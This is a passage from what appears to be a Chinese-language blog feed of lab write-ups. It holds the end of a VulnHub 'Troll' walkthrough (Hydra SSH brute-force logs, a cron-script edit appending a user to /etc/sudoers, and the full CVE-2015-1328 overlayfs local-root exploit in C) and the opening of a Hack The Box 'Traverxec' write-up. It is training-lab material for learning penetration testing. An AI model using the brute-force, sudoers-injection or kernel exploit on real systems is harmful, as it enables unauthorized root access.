192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 16 of 21 [child 0] (0/1)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 17 of 22 [child 0] (0/2)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 18 of 23 [child 0] (0/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 19 of 23 [child 0] (0/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 20 of 23 [child 0] (0/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[REDO-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 21 of 23 [child 0] (1/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[REDO-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 22 of 23 [child 0] (2/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[REDO-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 23 of 23 [child 0] (3/3)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.66.15 (waiting <span class="keyword">for</span> children to complete tests)</span><br><span class="line">1 of 1 target completed, 0 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-31 03:34:49</span><br></pre></td></tr></table></figure>

<p>问题始于用户blawrg，如果hydra无法登录，则主机将阻止Kali的IP。必须更改Kali的IP，然后才能开始尝试新用户。爆破完成，但是没有用户可以登录。</p>
<p>注意到包含Pass.txt的目录是this_folder_contains_the_password。这可能意味着某些情况，因此再次尝试使用Pass.txt作为密码，但溢出后可以使用密码WTH！登录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 16 of 20 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;&quot;</span> - 17 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;vis1t0r&quot;</span> - pass <span class="string">&quot;Pass.txt&quot;</span> - 18 of 20 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 19 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;overflow&quot;</span> - pass <span class="string">&quot;Pass.txt&quot;</span> - 20 of 20 [child 0] (0/0)</span><br><span class="line">[22][ssh] host: 192.168.66.15   login: overflow   password: Pass.txt</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.66.15 (waiting <span class="keyword">for</span> children to complete tests)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-31 03:41:02</span><br></pre></td></tr></table></figure>

<p>成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh overflow@192.168.66.15</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">overflow@192.168.66.15<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">overflow@192.168.66.15&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line">New release <span class="string">&#x27;16.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12</span><br><span class="line">Could not <span class="built_in">chdir</span> to home directory /home/overflow: No such file or directory</span><br><span class="line">$ id</span><br><span class="line">uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)</span><br><span class="line">$ whoami</span><br><span class="line">overflow</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>登录后，尝试找到该flag，但找不到。由于overflow是低权限用户，因此必须提权并找到root flag，然后再访问更多目录。</p>
<ul>
<li>已经检查crontabs，并且没有文件可写。</li>
<li>tmp目录为空</li>
</ul>
<p>我开始在var/中检查world可写文件。没有有趣的文件，但是只有一个。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ l_path=var/*/*;<span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$l_path</span>&quot;</span> != / -a <span class="string">&quot;<span class="variable">$l_path</span>&quot;</span> != . ]; <span class="keyword">do</span> ls -ld <span class="variable">$l_path</span>; l_path=$(dirname -- <span class="string">&quot;<span class="variable">$l_path</span>&quot;</span>);<span class="keyword">done</span>;</span><br><span class="line">...</span><br><span class="line">-rwxrwxrwx  1 root       root            23 Aug 13  2014 var/<span class="built_in">log</span>/cronlog</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>检查var/log/cronlog</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat var/<span class="built_in">log</span>/cronlog</span><br><span class="line">*/2 * * * * cleaner.py</span><br></pre></td></tr></table></figure>

<p>这是cron job，每2分钟运行一次。如果可以修改cleaner.py并让系统做点什么，那么就可以升级overflow的权限。但是首先，必须找到cleaner.py。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -name cleaner.py 2&gt;/dev/null | grep <span class="string">&quot;cleaner.py&quot;</span></span><br><span class="line">/lib/<span class="built_in">log</span>/cleaner.py</span><br></pre></td></tr></table></figure>

<p>查看cleaner.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /lib/<span class="built_in">log</span>/cleaner.py</span><br><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;rm -r /tmp/* &#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>

<p>找到了python文件，它是可写的。</p>
<ul>
<li>修改cleaner.py</li>
</ul>
<p>通过向帐户溢出添加sudo su    权限来修改了cleaner.py。当执行bash命令sudo su时，会得到root shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">overflow@troll:/$ cat /lib/<span class="built_in">log</span>/cleaner.py</span><br><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;echo &quot;overflow ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>

<p>等待2分钟…。靶机将我踢了出去，再次登录并可升级为root。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> overflow: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> overflow: </span><br><span class="line">root@troll:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@troll:/<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@troll:/<span class="comment"># pwd</span></span><br><span class="line">/</span><br><span class="line">root@troll:/<span class="comment"># cd /root</span></span><br><span class="line">root@troll:~<span class="comment"># ls</span></span><br><span class="line">proof.txt</span><br><span class="line">root@troll:~<span class="comment"># cat proof.txt</span></span><br><span class="line">Good job, you did it! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">702a8c18d29c6f3ca0d99ef5712bfbdc</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub232.jpg"></li>
</ul>
<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>linux 内核提权</p>
<p>参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzcyOTI=">Linux-Kernel-3.13.0-3.19-Ubuntu-12.04/14.04/14.10/15.04-‘overlayfs’-Local-Privilege-Escalation<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>CVE : CVE-2015-1328 </li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># Exploit Title: ofs.c - overlayfs local root in ubuntu</span></span><br><span class="line"><span class="comment"># Date: 2015-06-15</span></span><br><span class="line"><span class="comment"># Exploit Author: rebel</span></span><br><span class="line"><span class="comment"># Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)</span></span><br><span class="line"></span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">CVE-2015-1328 / ofs.c</span><br><span class="line">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span><br><span class="line"></span><br><span class="line">user@ubuntu-server-1504:~$ uname -a</span><br><span class="line">Linux ubuntu-server-1504 3.19.0-18-generic <span class="comment">#18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">user@ubuntu-server-1504:~$ gcc ofs.c -o ofs</span><br><span class="line">user@ubuntu-server-1504:~$ id</span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)</span><br><span class="line">user@ubuntu-server-1504:~$ ./ofs</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">greets to beist &amp; kaliman</span><br><span class="line">2015-05-24</span><br><span class="line">%rebel%</span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><span class="line"></span><br><span class="line">static char child_stack[1024*1024];</span><br><span class="line"></span><br><span class="line">static int</span><br><span class="line">child_exec(void *stuff)</span><br><span class="line">&#123;</span><br><span class="line">    char *file;</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit&quot;</span>, 0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/work&quot;</span>, 0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/upper&quot;</span>,0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>,0777);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,<span class="string">&quot;mount #1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;</span>) != 0) &#123;</span><br><span class="line">// workdir= and <span class="string">&quot;overlay&quot;</span> is needed on newer kernels, also can<span class="string">&#x27;t use /proc as lower</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;);</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        file = &quot;.access&quot;;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125; else file = &quot;ns_last_pid&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    rename(file,&quot;ld.so.preload&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/&quot;);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;mount #2\n&quot;);</span></span><br><span class="line"><span class="string">    if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int</span></span><br><span class="line"><span class="string">main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int status, fd, lib;</span></span><br><span class="line"><span class="string">    pid_t wrapper, init;</span></span><br><span class="line"><span class="string">    int clone_flags = CLONE_NEWNS | SIGCHLD;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;spawning threads\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if((wrapper = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">        if(unshare(CLONE_NEWUSER) != 0)</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;failed to create new user namespace\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if((init = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">            pid_t pid =</span></span><br><span class="line"><span class="string">                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span></span><br><span class="line"><span class="string">            if(pid &lt; 0) &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;failed to create new mount namespace\n&quot;);</span></span><br><span class="line"><span class="string">                exit(-1);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            waitpid(pid, &amp;status, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        waitpid(init, &amp;status, 0);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    usleep(300000);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    wait(NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;child threads done\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(fd == -1) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;exploit failed\n&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;creating shared library\n&quot;);</span></span><br><span class="line"><span class="string">    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);</span></span><br><span class="line"><span class="string">    write(lib,LIB,strlen(LIB));</span></span><br><span class="line"><span class="string">    close(lib);</span></span><br><span class="line"><span class="string">    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);</span></span><br><span class="line"><span class="string">    if(lib != 0) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;couldn&#x27;</span>t create dynamic library\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    write(fd,&quot;</span>/tmp/ofs-lib.so\n<span class="string">&quot;,16);</span></span><br><span class="line"><span class="string">    close(fd);</span></span><br><span class="line"><span class="string">    system(&quot;</span>rm -rf /tmp/ns_sploit /tmp/ofs-lib.c<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    execl(&quot;</span>/bin/su<span class="string">&quot;,&quot;</span>su<span class="string">&quot;,NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>过程太简单在这里就不多写文演示了</p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>ftp匿名登录</li>
<li>hydra爆破ssh密码</li>
<li>cron job + world writeable py脚本提权</li>
<li>CVE-2015-1328 linux内核提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[Traverxec]</title>
    <url>/2020/04/21/Traverxec/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>操作系统：Linux<br>难度：容易<br>点数：20<br>发行：2019年11月16日<br>IP：10.10.10.165</p>
<p>user一血用时：2小时26分钟49秒。<br>root一血用时：3小时06分钟28秒。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb24.jpg"></li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p- -v -sV 10.10.10.165 --min-rate=1000 -T4</span><br><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">22/tcp open  tcpwrapped</span><br><span class="line">80/tcp open  tcpwrapped</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p 22,80 -v -A -T4 10.10.10.165</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 aa:99:a8:16:68:<span class="built_in">cd</span>:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)</span><br><span class="line">|_  256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)</span><br><span class="line">80/tcp open  http    nostromo 1.9.6</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="line">|_http-server-header: nostromo 1.9.6</span><br><span class="line">|_http-title: TRAVERXEC</span><br></pre></td></tr></table></figure>

<p>扫描显示端口22和80是打开的。Nmap将HTTP-server-header报告为nostromo 1.9.6，这意味着该框正在运行nostromo HTTP服务。</p>
<p>Nostromo或nhttpd是一个开源web服务器。</p>
<p>网页似乎没有显示任何有趣的东西，Gobuster扫描也没有发现任何有用的东西。</p>
<h3 id="人工利用"><a href="#人工利用" class="headerlink" title="人工利用"></a>人工利用</h3><p>经过一些研究，nostromo版本1.9.6有一个远程代码执行漏洞。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDc4Mzc=">nostromo-1.9.6-Remote-Code-Execution<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>现在下载python漏洞利用脚本并按如下方式执行它</p>
<p>先查看exploit的内容</p>
